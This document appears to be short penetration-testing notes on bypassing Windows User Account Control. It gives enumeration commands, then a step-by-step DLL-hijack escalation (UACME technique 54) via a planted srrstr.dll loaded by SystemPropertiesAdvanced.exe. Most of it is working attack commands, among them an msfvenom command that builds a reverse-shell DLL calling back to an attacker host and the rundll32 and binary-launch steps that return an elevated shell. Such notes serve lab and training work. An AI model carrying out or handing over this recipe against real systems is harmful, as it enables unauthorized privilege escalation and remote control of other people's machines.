# UAC

Check current user with `whoami /user`

Check admin group membership: `net localgroup administrators`

Check privileges: `whoami /priv`

Check if UAC is enabled:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

0x1 is enabled.

Check UAC level:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

If its is 0x5 then `Always notify is enabled`

Check windows version with powershell:

```
[environment]::OSVersion.Version
```

Then cross-reference with this [page](https://en.wikipedia.org/wiki/Windows\_10\_version\_history)

Then check UACME.&#x20;

Here trying technique 54:&#x20;

This technique targets the 32-bit version of the auto-elevating binary **SystemPropertiesAdvanced.exe**.

It tries to load a non-existent dll **srrstr.dll**

It follows the following search order:

1. The directory from which the application loaded.
2. The system directory C:\Windows\System32 for 64-bit systems.
3. The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

Check path:&#x20;

`cmd /c echo %PATH%`&#x20;

Then we can place a malicious srrstr.dll DLL to WindowsApps folder.

Malicious srrstr.dll&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > srrstr.dll
```

Now running the dll we get a normal reverse shell back:

```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

To get privileged shell back run: `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe` We get a reverse shell back.
